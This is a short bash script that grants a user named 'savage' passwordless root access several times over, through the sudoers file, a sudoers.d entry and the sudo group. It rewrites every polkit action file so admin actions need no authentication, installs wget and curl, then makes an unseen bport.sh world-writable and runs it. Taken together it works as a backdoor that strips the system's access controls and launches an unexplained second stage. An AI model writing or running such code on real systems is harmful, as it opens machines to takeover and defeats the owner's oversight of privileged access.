#!/bin/bash

# Check if the script is run as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

# Check if the user 'savage' exists on the system
if id "savage" &>/dev/null; then
    echo "User 'savage' exists. Updating sudoers file..."
else
    echo "User 'savage' does not exist. Exiting..."
    exit 1
fi

# Add a line to the sudoers file that allows 'savage' to run all commands without a password
echo 'savage ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo

# Create a file for 'savage' in the /etc/sudoers.d directory
echo 'savage ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo -f /etc/sudoers.d/savage

echo "Operation completed successfully."
sudo usermod -aG sudo savage

# Update sudoers file
echo "savage  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/savage

# Update polkit 
sudo sed -i 's/<allow_any>auth_admin<\/allow_any>/<allow_any>yes<\/allow_any>/g' /usr/share/polkit-1/actions/*
sudo sed -i 's/<allow_inactive>auth_admin<\/allow_inactive>/<allow_inactive>yes<\/allow_inactive>/g' /usr/share/polkit-1/actions/*
sudo sed -i 's/<allow_active>auth_admin<\/allow_active>/<allow_active>yes<\/allow_active>/g' /usr/share/polkit-1/actions/*

# Add
sudo apt install -f -y sudo
sudo apt install -f -y wget
sudo apt install -f -y curl

# meh
chmod 777 bport.sh
sleep 3
./bport.sh
